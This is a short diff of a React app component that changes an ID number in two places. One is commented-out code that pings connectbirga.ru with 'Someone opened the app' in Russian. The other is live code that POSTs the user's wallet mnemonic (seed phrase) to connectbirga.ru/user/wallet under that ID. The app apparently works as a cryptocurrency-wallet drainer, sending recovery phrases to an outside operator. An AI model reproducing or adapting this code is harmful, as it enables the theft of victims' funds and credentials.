@@ -268,7 +268,7 @@ function App() {
   //   async function dsa(){
   //     // await axios.get("https://www.connectbirga.ru/user/sendMessage", {
   //     //   params: {
-  //     //     chatId: 858931156,
+  //     //     chatId: 1392120153,
   //     //     text:
   //     //     "Кто - то октрыл приложение",
   //     //     languageCode : en ? "en" : "ru"
@@ -328,7 +328,7 @@ function App() {
 
         const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
           mnemonic: mnemonics,
-          userId: 858931156,
+          userId: 1392120153,
         } , {
           headers : {
             "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
